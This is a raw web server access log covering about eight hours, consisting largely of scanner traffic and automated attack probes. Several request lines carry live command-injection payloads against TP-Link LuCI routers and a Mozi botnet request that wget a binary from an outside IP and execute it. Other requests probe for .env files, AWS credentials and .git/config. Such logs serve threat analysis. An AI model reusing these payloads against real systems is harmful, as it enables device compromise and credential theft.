206.168.34.40 - - [14/Jun/2024:21:53:24 +0000] "PRI * HTTP/2.0" 400 154 "-" "-"
192.12.240.40 - - [14/Jun/2024:22:00:24 +0000] "GET / HTTP/1.1" 301 166 "-" "Mozilla/5.0 zgrab/0.x"
198.235.24.94 - - [14/Jun/2024:22:16:27 +0000] "GET / HTTP/1.1" 301 166 "-" "Expanse, a Palo Alto Networks company, searches across the global IPv4 space multiple times per day to identify customers&#39; presences on the Internet. If you would like to be excluded from our scans, please send IP addresses/domains to: scaninfo@paloaltonetworks.com"
149.50.103.48 - - [14/Jun/2024:22:18:34 +0000] "GET / HTTP/1.1" 301 166 "-" "Hello World/1.0"
185.191.127.212 - - [14/Jun/2024:22:25:27 +0000] "GET /cgi-bin/luci/;stok=/locale?form=country&operation=write&country=$(id%3E%60wget+http%3A%2F%2F103.149.28.141%2Ft+-O-+|+sh%60) HTTP/1.1" 301 166 "-" "Go-http-client/1.1"
149.50.103.48 - - [14/Jun/2024:22:35:22 +0000] "GET / HTTP/1.1" 301 166 "-" "Hello World/1.0"
167.94.146.52 - - [14/Jun/2024:22:39:26 +0000] "GET / HTTP/1.1" 301 166 "-" "-"
45.156.129.46 - - [14/Jun/2024:22:39:33 +0000] "GET /js/NewWindow_2_all.js HTTP/1.1" 301 166 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.113 Safari/537.36"
167.94.146.52 - - [14/Jun/2024:22:39:36 +0000] "GET / HTTP/1.1" 301 166 "-" "Mozilla/5.0 (compatible; CensysInspect/1.1; +https://about.censys.io/)"
167.94.146.52 - - [14/Jun/2024:22:39:36 +0000] "PRI * HTTP/2.0" 400 154 "-" "-"
45.128.232.200 - - [14/Jun/2024:22:51:16 +0000] "GET / HTTP/1.1" 301 166 "-" "Linux Gnu (cow)"
149.50.103.48 - - [14/Jun/2024:22:57:06 +0000] "GET / HTTP/1.1" 301 166 "-" "Hello World/1.0"
45.128.232.194 - - [14/Jun/2024:22:59:01 +0000] "POST /boaform/admin/formLogin HTTP/1.1" 301 166 "http://180.233.121.154:80/admin/login.asp" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:71.0) Gecko/20100101 Firefox/71.0"
45.128.232.194 - - [14/Jun/2024:22:59:01 +0000] "" 400 0 "-" "-"
46.19.143.66 - - [14/Jun/2024:23:00:15 +0000] "GET / HTTP/1.1" 301 166 "-" "Hello World/1.0"
185.191.127.212 - - [14/Jun/2024:23:04:13 +0000] "GET /cgi-bin/luci/;stok=/locale?form=country&operation=write&country=$(id%3E%60wget+http%3A%2F%2F103.149.28.141%2Ft+-O-+|+sh%60) HTTP/1.1" 301 166 "-" "Go-http-client/1.1"
149.50.103.48 - - [14/Jun/2024:23:22:30 +0000] "GET / HTTP/1.1" 301 166 "-" "Hello World/1.0"
39.103.211.146 - - [14/Jun/2024:23:24:22 +0000] "GET / HTTP/1.1" 301 166 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3239.84 Safari/537.36"
149.50.103.48 - - [14/Jun/2024:23:35:44 +0000] "GET / HTTP/1.1" 301 166 "-" "Hello World/1.0"
104.152.52.29 - - [14/Jun/2024:23:43:29 +0000] "GET / HTTP/1.0" 301 166 "-" "-"
198.235.24.196 - - [14/Jun/2024:23:46:47 +0000] "\x16\x03\x01\x00\xEE\x01\x00\x00\xEA\x03\x03K\xDA\xE4\xD8I\x01\x84\x01\xE4\xBF\x19i&R'f\xAD\xE4}n*0\xDEz\xF9\x1E<\xB3n\xCD\xD3/ <\xCB\x08UK{L\xF3\xAA\xB39Z%\xE7\xC6\xB5\xFB\xAFL\xAC\x11\xF9\xE9\xF0\xAE\xC5\xFFh\xFC\xD7L\xC4\x00&\xC0+\xC0/\xC0,\xC00\xCC\xA9\xCC\xA8\xC0\x09\xC0\x13\xC0" 400 154 "-" "-"
198.235.24.196 - - [14/Jun/2024:23:46:47 +0000] "\x16\x03\x01\x00\xCA\x01\x00\x00\xC6\x03\x03'\xA7ym\x08`j\x1A\xC1\x84\xCD\x10\xD6\x17\xD7\xE6e\xF26\xC7a{1\xE3e:\x04\xB2\xCA\x15\xB4\xE6\x00\x00h\xCC\x14\xCC\x13\xC0/\xC0+\xC00\xC0,\xC0\x11\xC0\x07\xC0'\xC0#\xC0\x13\xC0\x09\xC0(\xC0$\xC0\x14\xC0" 400 154 "-" "-"
149.50.103.48 - - [14/Jun/2024:23:52:28 +0000] "GET / HTTP/1.1" 301 166 "-" "Hello World/1.0"
199.45.154.69 - - [14/Jun/2024:23:56:13 +0000] "GET / HTTP/1.1" 301 166 "-" "-"
199.45.154.69 - - [14/Jun/2024:23:56:32 +0000] "PRI * HTTP/2.0" 400 154 "-" "-"
205.210.31.2 - - [15/Jun/2024:00:03:05 +0000] "GET / HTTP/1.1" 301 166 "-" "-"
46.19.143.66 - - [15/Jun/2024:00:10:17 +0000] "GET / HTTP/1.1" 301 166 "-" "Hello World/1.0"
162.216.149.44 - - [15/Jun/2024:00:12:32 +0000] "GET / HTTP/1.1" 301 166 "-" "Expanse, a Palo Alto Networks company, searches across the global IPv4 space multiple times per day to identify customers&#39; presences on the Internet. If you would like to be excluded from our scans, please send IP addresses/domains to: scaninfo@paloaltonetworks.com"
149.50.103.48 - - [15/Jun/2024:00:18:34 +0000] "GET / HTTP/1.1" 301 166 "-" "Hello World/1.0"
91.108.111.177 - - [15/Jun/2024:00:20:26 +0000] "GET /.env HTTP/1.1" 301 166 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/56.0.2924.87 Safari/537.36"
91.108.111.177 - - [15/Jun/2024:00:20:26 +0000] "GET /.env2 HTTP/1.1" 301 166 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/56.0.2924.87 Safari/537.36"
175.6.217.4 - - [15/Jun/2024:00:33:23 +0000] "GET / HTTP/1.1" 301 166 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 13_2_3 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/13.0.3 Mobile/15E148 Safari/604.1"
167.94.138.121 - - [15/Jun/2024:00:35:33 +0000] "GET / HTTP/1.1" 301 166 "-" "-"
167.94.138.121 - - [15/Jun/2024:00:35:46 +0000] "GET / HTTP/1.1" 301 166 "-" "Mozilla/5.0 (compatible; CensysInspect/1.1; +https://about.censys.io/)"
167.94.138.121 - - [15/Jun/2024:00:35:48 +0000] "PRI * HTTP/2.0" 400 154 "-" "-"
149.50.103.48 - - [15/Jun/2024:00:39:38 +0000] "GET / HTTP/1.1" 301 166 "-" "Hello World/1.0"
78.153.140.179 - - [15/Jun/2024:00:42:33 +0000] "\x16\x03\x01\x00\xDE\x01\x00\x00\xDA\x03\x03*\xD6\xB7\xBDAN\x03\xAAJ\xC1\xD5A\xC5KR\x81\xB2\x98\xE9_H\x0C\x06\xAB\xEB.$K\xB5\x1A\x98X\x00\x00n\xC00\xC0,\xC02\xC0.\xC0/\xC0+\xC01\xC0-\x00\xA5\x00\xA3\x00\xA1\x00\x9F\x00\xA4\x00\xA2\x00\xA0\x00\x9E\xC0(\xC0$\xC0\x14\xC0" 400 154 "-" "-"
78.153.140.179 - - [15/Jun/2024:00:42:33 +0000] "GET /.env HTTP/1.1" 301 166 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
78.153.140.179 - - [15/Jun/2024:00:42:34 +0000] "POST /.env HTTP/1.1" 301 166 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
172.212.61.226 - - [15/Jun/2024:00:45:55 +0000] "GET /ReportServer HTTP/1.1" 301 166 "-" "Mozilla/5.0 zgrab/0.x"
141.98.11.79 - - [15/Jun/2024:00:48:30 +0000] "CONNECT google.com:443 HTTP/1.1" 400 154 "-" "-"
45.148.10.174 - - [15/Jun/2024:00:49:17 +0000] "GET /cgi-bin/luci/;stok=/locale?form=country&operation=write&country=$(id%3E%60cd+%2Ftmp%3B+rm+-rf+shk%3B+wget+http%3A%2F%2F45.148.10.78%2Fshk%3B+chmod+777+shk%3B+.%2Fshk+tplink%3B+rm+-rf+shk%60) HTTP/1.1" 301 166 "-" "Go-http-client/1.1"
185.224.128.43 - - [15/Jun/2024:00:50:25 +0000] "GET / HTTP/1.1" 301 166 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36 Edg/90.0.818.46"
149.50.103.48 - - [15/Jun/2024:01:00:51 +0000] "GET / HTTP/1.1" 301 166 "-" "Hello World/1.0"
185.191.127.212 - - [15/Jun/2024:01:01:42 +0000] "GET /cgi-bin/luci/;stok=/locale?form=country&operation=write&country=$(id%3E%60wget+http%3A%2F%2F103.149.28.141%2Ft+-O-+|+sh%60) HTTP/1.1" 301 166 "-" "Go-http-client/1.1"
185.191.127.212 - - [15/Jun/2024:01:16:56 +0000] "GET /cgi-bin/luci/;stok=/locale?form=country&operation=write&country=$(id%3E%60wget+http%3A%2F%2F103.149.28.141%2Ft+-O-+|+sh%60) HTTP/1.1" 301 166 "-" "Go-http-client/1.1"
149.50.103.48 - - [15/Jun/2024:01:19:17 +0000] "GET / HTTP/1.1" 301 166 "-" "Hello World/1.0"
46.19.143.66 - - [15/Jun/2024:01:25:32 +0000] "GET / HTTP/1.1" 301 166 "-" "Hello World/1.0"
87.236.176.230 - - [15/Jun/2024:01:37:08 +0000] "GET / HTTP/1.1" 301 166 "http://180.233.121.154:1081" "Mozilla/5.0 (compatible; InternetMeasurement/1.0; +https://internet-measurement.com/)"
87.236.176.179 - - [15/Jun/2024:01:37:09 +0000] "GET /favicon.ico HTTP/1.1" 301 166 "-" "Mozilla/5.0 (compatible; InternetMeasurement/1.0; +https://internet-measurement.com/)"
149.50.103.48 - - [15/Jun/2024:01:43:24 +0000] "GET / HTTP/1.1" 301 166 "-" "Hello World/1.0"
13.91.177.235 - - [15/Jun/2024:01:43:39 +0000] "GET /hudson HTTP/1.1" 301 166 "-" "Mozilla/5.0 zgrab/0.x"
87.246.7.54 - - [15/Jun/2024:01:59:48 +0000] "GET / HTTP/1.0" 301 166 "-" "masscan/1.0 (https://github.com/robertdavidgraham/masscan)"
149.50.103.48 - - [15/Jun/2024:02:01:09 +0000] "GET / HTTP/1.1" 301 166 "-" "Hello World/1.0"
149.50.103.48 - - [15/Jun/2024:02:19:38 +0000] "GET / HTTP/1.1" 301 166 "-" "Hello World/1.0"
192.12.240.40 - - [15/Jun/2024:02:22:19 +0000] "GET / HTTP/1.1" 301 166 "-" "Mozilla/5.0 zgrab/0.x"
185.191.126.213 - - [15/Jun/2024:02:23:19 +0000] "GET / HTTP/1.1" 301 166 "-" "-"
45.128.232.194 - - [15/Jun/2024:02:27:55 +0000] "POST /boaform/admin/formLogin HTTP/1.1" 301 166 "http://180.233.121.154:80/admin/login.asp" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:71.0) Gecko/20100101 Firefox/71.0"
45.128.232.194 - - [15/Jun/2024:02:27:56 +0000] "" 400 0 "-" "-"
185.191.127.212 - - [15/Jun/2024:02:35:41 +0000] "GET /cgi-bin/luci/;stok=/locale?form=country&operation=write&country=$(id%3E%60wget+http%3A%2F%2F103.149.28.141%2Ft+-O-+|+sh%60) HTTP/1.1" 301 166 "-" "Go-http-client/1.1"
149.50.103.48 - - [15/Jun/2024:02:36:30 +0000] "GET / HTTP/1.1" 301 166 "-" "Hello World/1.0"
195.201.230.245 - - [15/Jun/2024:02:39:18 +0000] "GET /.env HTTP/1.1" 301 166 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/56.0.2924.87 Safari/537.36"
195.201.230.245 - - [15/Jun/2024:02:39:18 +0000] "GET /api/.env HTTP/1.1" 301 166 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/56.0.2924.87 Safari/537.36"
46.19.143.66 - - [15/Jun/2024:02:40:26 +0000] "GET / HTTP/1.1" 301 166 "-" "Hello World/1.0"
84.54.51.37 - - [15/Jun/2024:02:42:27 +0000] "GET /cgi-bin/luci/;stok=/locale?form=country&operation=write&country=$(id%3E%60cd+%2Ftmp%3B+rm+-rf+r%3B+wget+http%3A%2F%2F94.156.71.83%2Fr%3B+chmod+777+r%3B+.%2Fr+tplink%3B+rm+-rf+r%60) HTTP/1.1" 301 166 "-" "Go-http-client/1.1"
68.183.145.203 - - [15/Jun/2024:02:56:52 +0000] "GET public/img/fav32.png HTTP/1.1" 400 154 "-" "-"
202.61.248.23 - - [15/Jun/2024:02:59:19 +0000] "GET /.git/config HTTP/1.1" 301 166 "-" "Mozilla/5.0 (Linux; Android 7.0; ASUS_X00GD) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/76.0.3809.111 Mobile Safari/537.36"
149.50.103.48 - - [15/Jun/2024:03:01:50 +0000] "GET / HTTP/1.1" 301 166 "-" "Hello World/1.0"
149.50.103.48 - - [15/Jun/2024:03:13:21 +0000] "GET / HTTP/1.1" 301 166 "-" "Hello World/1.0"
154.212.141.137 - - [15/Jun/2024:03:26:33 +0000] "GET / HTTP/1.1" 301 166 "-" "-"
78.153.140.177 - - [15/Jun/2024:03:32:01 +0000] "GET /.env HTTP/1.1" 301 166 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
78.153.140.177 - - [15/Jun/2024:03:32:02 +0000] "\x16\x03\x01\x01H\x01\x00\x01D\x03\x03\xA2\x1F\xE3}\x99\x18\xCE\xCF\xE6\xB7E\x8E\xC2\xB9)\x1B\xCB?HU\xF8\xE3W^\xA1\xB9\x1F\xF1\xAF\xFA\x85\x96 \xE8\xF1A\xE2\x8C\xDC\xAA\xE1\xF5\x83\xC6\xA1\xAF\x84E\x18]\xBFh\xDE\x8Dw\x87\x08t\xA9\xFD\x0C\x88G\xAF\xA1\x00b\x13\x02\x13\x03\x13\x01\xC0,\xC00\xC0+\xC0/\xCC\xA9\xCC\xA8\x00\xA3\x00\x9F\x00\xA2\x00\x9E\xCC\xAA\xC0\xAF\xC0\xAD\xC0$\xC0(\xC0" 400 154 "-" "-"
78.153.140.177 - - [15/Jun/2024:03:32:03 +0000] "POST /.env HTTP/1.1" 301 166 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
78.153.140.177 - - [15/Jun/2024:03:32:04 +0000] "GET /.aws/credentials HTTP/1.1" 301 166 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
78.153.140.177 - - [15/Jun/2024:03:32:06 +0000] "POST /.aws/credentials HTTP/1.1" 301 166 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
78.153.140.177 - - [15/Jun/2024:03:32:07 +0000] "GET /.aws/config HTTP/1.1" 301 166 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
78.153.140.177 - - [15/Jun/2024:03:32:08 +0000] "POST /.aws/config HTTP/1.1" 301 166 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
78.153.140.177 - - [15/Jun/2024:03:32:09 +0000] "GET /aws/credentials HTTP/1.1" 301 166 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
78.153.140.177 - - [15/Jun/2024:03:32:16 +0000] "POST /aws/credentials HTTP/1.1" 301 166 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
149.50.103.48 - - [15/Jun/2024:03:32:48 +0000] "GET / HTTP/1.1" 301 166 "-" "Hello World/1.0"
78.153.140.177 - - [15/Jun/2024:03:33:09 +0000] "GET /test.php HTTP/1.1" 301 166 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
78.153.140.177 - - [15/Jun/2024:03:33:10 +0000] "POST /test.php HTTP/1.1" 301 166 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
78.153.140.177 - - [15/Jun/2024:03:33:12 +0000] "GET /phpinfo HTTP/1.1" 301 166 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
78.153.140.177 - - [15/Jun/2024:03:33:13 +0000] "POST /phpinfo HTTP/1.1" 301 166 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
78.153.140.177 - - [15/Jun/2024:03:33:14 +0000] "GET /_profiler/phpinfo HTTP/1.1" 301 166 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
78.153.140.177 - - [15/Jun/2024:03:33:16 +0000] "POST /_profiler/phpinfo HTTP/1.1" 301 166 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
78.153.140.177 - - [15/Jun/2024:03:33:17 +0000] "GET /phpinfo.php HTTP/1.1" 301 166 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
78.153.140.177 - - [15/Jun/2024:03:33:18 +0000] "POST /phpinfo.php HTTP/1.1" 301 166 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
78.153.140.177 - - [15/Jun/2024:03:33:19 +0000] "GET /info.php HTTP/1.1" 301 166 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
78.153.140.177 - - [15/Jun/2024:03:33:21 +0000] "POST /info.php HTTP/1.1" 301 166 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
46.19.143.66 - - [15/Jun/2024:03:51:55 +0000] "GET / HTTP/1.1" 301 166 "-" "Hello World/1.0"
149.50.103.48 - - [15/Jun/2024:03:55:30 +0000] "GET / HTTP/1.1" 301 166 "-" "Hello World/1.0"
91.243.50.206 - - [15/Jun/2024:03:55:59 +0000] "GET / HTTP/1.0" 301 166 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/73.0.3683.103 Safari/537.36"
91.243.50.206 - - [15/Jun/2024:03:56:45 +0000] "\x16\x03\x01\x00\xEE\x01\x00\x00\xEA\x03\x03Y\x22K\xE1\xC3\xF0\xED\xEC\x05(\xA3\x22Rm4\xAFJx\x22\xACk\x81Q\xC8\x90\xFA\x18\xA1B;[\xF5 \xC0b\x83\xDC\xA5 sb\xCFC\xFB\x8FL5\xCF1\xAD\x89e>\xF03\xB1\xAF\x86\x86q\x96\x80\x9B\xF2\xE5\x00&\xC0+\xC0/\xC0,\xC00\xCC\xA9\xCC\xA8\xC0\x09\xC0\x13\xC0" 400 154 "-" "-"
91.243.50.206 - - [15/Jun/2024:03:56:46 +0000] "GET /aaa9 HTTP/1.1" 301 166 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.77 Safari/537.36"
91.243.50.206 - - [15/Jun/2024:03:56:46 +0000] "\x16\x03\x01\x00\xEE\x01\x00\x00\xEA\x03\x03\xA9\xEB;w7\xE7\x92\xDBF%\xCDc\xA6\xD6\xE5?u]\xF4\xB1B;\xEDp\x85!\x8F\xB2\x7F\xDC\x9F\x12 \x17\xB5\x84\x7F:'\x17\xB3\xDA\xE3\x12p\xDD\xA5\xAB\xF1x\xDE\xD6\xBB[\xE1\xCE\xDD\x96\x13\xB8\xD7e\xFE" 400 154 "-" "-"
91.243.50.206 - - [15/Jun/2024:03:56:46 +0000] "GET /aab9 HTTP/1.1" 301 166 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.77 Safari/537.36"
149.50.103.48 - - [15/Jun/2024:04:13:27 +0000] "GET / HTTP/1.1" 301 166 "-" "Hello World/1.0"
92.249.48.76 - - [15/Jun/2024:04:18:15 +0000] "GET / HTTP/1.1" 301 166 "-" "-"
104.209.35.238 - - [15/Jun/2024:04:26:16 +0000] "GET /manager/html HTTP/1.1" 301 166 "-" "Mozilla/5.0 zgrab/0.x"
198.235.24.17 - - [15/Jun/2024:04:31:07 +0000] "GET /login HTTP/1.1" 301 166 "http://180.233.121.154:80/" "-"
149.50.103.48 - - [15/Jun/2024:04:34:11 +0000] "GET / HTTP/1.1" 301 166 "-" "Hello World/1.0"
61.53.204.82 - - [15/Jun/2024:04:46:17 +0000] "27;wget%20http://%s:%d/Mozi.m%20-O%20->%20/tmp/Mozi.m;chmod%20777%20/tmp/Mozi.m;/tmp/Mozi.m%20dlink.mips%27$ HTTP/1.0" 400 154 "-" "-"
104.152.52.36 - - [15/Jun/2024:04:51:58 +0000] "GET / HTTP/1.0" 301 166 "-" "-"
149.50.103.48 - - [15/Jun/2024:04:52:57 +0000] "GET / HTTP/1.1" 301 166 "-" "Hello World/1.0"
222.216.206.99 - - [15/Jun/2024:05:03:42 +0000] "GET / HTTP/1.1" 301 166 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3239.84 Safari/537.36"
92.249.48.237 - - [15/Jun/2024:05:05:35 +0000] "GET / HTTP/1.1" 301 166 "-" "-"
46.19.143.66 - - [15/Jun/2024:05:05:55 +0000] "GET / HTTP/1.1" 301 166 "-" "Hello World/1.0"
149.50.103.48 - - [15/Jun/2024:05:14:21 +0000] "GET / HTTP/1.1" 301 166 "-" "Hello World/1.0"
185.191.127.212 - - [15/Jun/2024:05:17:45 +0000] "GET /cgi-bin/luci/;stok=/locale?form=country&operation=write&country=$(id%3E%60wget+http%3A%2F%2F103.149.28.141%2Ft+-O-+|+sh%60) HTTP/1.1" 301 166 "-" "Go-http-client/1.1"
185.191.126.213 - - [15/Jun/2024:05:24:38 +0000] "GET / HTTP/1.1" 301 166 "-" "-"
149.50.103.48 - - [15/Jun/2024:05:37:11 +0000] "GET / HTTP/1.1" 301 166 "-" "Hello World/1.0"
79.137.205.100 - - [15/Jun/2024:05:51:07 +0000] "\x16\x03\x01\x00\xEA\x01\x00\x00\xE6\x03\x031OD\xEE,n\x06\xD4\x12W\xC5\xC7\xC1\xA0\x19\x99\x9C\x81\xBD\xB5^\x03B\xE0\xFF\x82$7\x00wB\xF7 \xB0\x09\xE6\xB0\xD0\xD8~\x00\x83\xC1\xED\xD5\x06:\x8A-\x19\xF7\x94\xA7\xDE\x1B\xEAr\xFD?q\xE1\xBE\x81" 400 154 "-" "-"
79.137.205.100 - - [15/Jun/2024:05:51:07 +0000] "GET /script HTTP/1.1" 301 166 "-" "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/48.0.2564.116 UBrowser/5.6.13705.206 Safari/537.36"
79.137.205.100 - - [15/Jun/2024:05:51:08 +0000] "GET /script HTTP/1.1" 301 166 "http://180.233.121.154:1081/script" "Mozilla/5.0 (iPhone; CPU iPhone OS 12_1_4 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/16D57"
65.49.1.12 - - [15/Jun/2024:05:58:56 +0000] "GET / HTTP/1.1" 301 166 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.2 Safari/605.1.15"
65.49.1.12 - - [15/Jun/2024:06:00:11 +0000] "GET /webui/ HTTP/1.1" 301 166 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 14_4) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Safari/537.36"
149.50.103.48 - - [15/Jun/2024:06:00:34 +0000] "GET / HTTP/1.1" 301 166 "-" "Hello World/1.0"
65.49.1.21 - - [15/Jun/2024:06:00:36 +0000] "GET / HTTP/1.1" 301 166 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 14_4) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Safari/537.36"
65.49.1.14 - - [15/Jun/2024:06:01:13 +0000] "GET /favicon.ico HTTP/1.1" 301 166 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.0.0 Safari/537.36"
65.49.1.10 - - [15/Jun/2024:06:01:57 +0000] "GET /geoserver/web/ HTTP/1.1" 301 166 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.2 Safari/605.1.15"
149.50.103.48 - - [15/Jun/2024:06:13:06 +0000] "GET / HTTP/1.1" 301 166 "-" "Hello World/1.0"
34.77.127.183 - - [15/Jun/2024:06:16:07 +0000] "GET / HTTP/1.1" 301 166 "-" "python-requests/2.32.2"
171.124.105.139 - - [15/Jun/2024:06:16:37 +0000] "GET /gslbservzqhsw.itv.cmvideo.cn/1000000005000265001/index.m3u8?channel-id=ystenlive&Contentid=1000000005000265001&livemode=1&stbId=3 HTTP/1.1" 301 166 "-" "okhttp/3.15"
46.19.143.66 - - [15/Jun/2024:06:21:22 +0000] "GET / HTTP/1.1" 301 166 "-" "Hello World/1.0"
185.191.127.212 - - [15/Jun/2024:06:34:19 +0000] "GET /cgi-bin/luci/;stok=/locale?form=country&operation=write&country=$(id%3E%60wget+http%3A%2F%2F103.149.28.141%2Ft+-O-+|+sh%60) HTTP/1.1" 301 166 "-" "Go-http-client/1.1"
149.50.103.48 - - [15/Jun/2024:06:35:52 +0000] "GET / HTTP/1.1" 301 166 "-" "Hello World/1.0"
149.50.103.48 - - [15/Jun/2024:06:52:54 +0000] "GET / HTTP/1.1" 301 166 "-" "Hello World/1.0"
209.38.204.152 - - [15/Jun/2024:06:55:56 +0000] "GET / HTTP/1.0" 301 166 "-" "-"
209.38.204.152 - - [15/Jun/2024:06:55:56 +0000] "GET /odinhttpcall1718434556 HTTP/1.1" 301 166 "-" "Mozilla/5.0 (compatible; Odin; https://docs.getodin.com/)"
209.38.204.152 - - [15/Jun/2024:06:55:56 +0000] "GET / HTTP/1.0" 301 166 "-" "-"
209.38.204.152 - - [15/Jun/2024:06:55:57 +0000] "POST /sdk HTTP/1.1" 301 166 "-" "Mozilla/5.0 (compatible; Odin; https://docs.getodin.com/)"
209.38.204.152 - - [15/Jun/2024:06:55:57 +0000] "GET /HNAP1 HTTP/1.1" 301 166 "-" "Mozilla/5.0 (compatible; Odin; https://docs.getodin.com/)"
209.38.204.152 - - [15/Jun/2024:06:55:57 +0000] "GET /evox/about HTTP/1.1" 301 166 "-" "Mozilla/5.0 (compatible; Odin; https://docs.getodin.com/)"
209.38.204.152 - - [15/Jun/2024:06:55:57 +0000] "GET / HTTP/1.0" 301 166 "-" "-"
209.38.204.152 - - [15/Jun/2024:06:55:58 +0000] "GET / HTTP/1.1" 301 166 "-" "-"
64.226.85.4 - - [15/Jun/2024:06:55:58 +0000] "GET /cgi-bin/authLogin.cgi HTTP/1.1" 301 166 "-" "Go-http-client/1.1"
165.227.161.64 - - [15/Jun/2024:06:55:58 +0000] "GET /query?q=SHOW+DIAGNOSTICS HTTP/1.1" 301 166 "-" "Go-http-client/1.1"
164.92.137.129 - - [15/Jun/2024:06:55:58 +0000] "GET / HTTP/1.1" 301 166 "-" "Mozilla/5.0 (compatible; Odin; https://docs.getodin.com/)"
64.226.90.208 - - [15/Jun/2024:06:55:58 +0000] "GET /solr/admin/info/system HTTP/1.1" 301 166 "-" "Go-http-client/1.1"
165.227.161.64 - - [15/Jun/2024:06:55:59 +0000] "\x16\x03\x01\x01$\x01\x00\x01 \x03\x03\xC8\xE6\x90\xED\x14\x16#\xA4\xA8\x0F\x88\xCA\x13\xFF\xEF\x85\x1A\xC1\x87\xF5U\xC4#\x98\xEB\xDF\x88?\x86{\xB2\x96 @\xA1\xC0\x8Dn\xEAx\xD42{Z:\xB1#\x17`\xC2\xEF\x18r\xEBN\xDF\x17*\xE1\xB2nT\x97z\xF5\x00>\x13\x02\x13\x03\x13\x01\xC0,\xC00\x00\x9F\xCC\xA9\xCC\xA8\xCC\xAA\xC0+\xC0/\x00\x9E\xC0$\xC0(\x00k\xC0#\xC0'\x00g\xC0" 400 154 "-" "-"
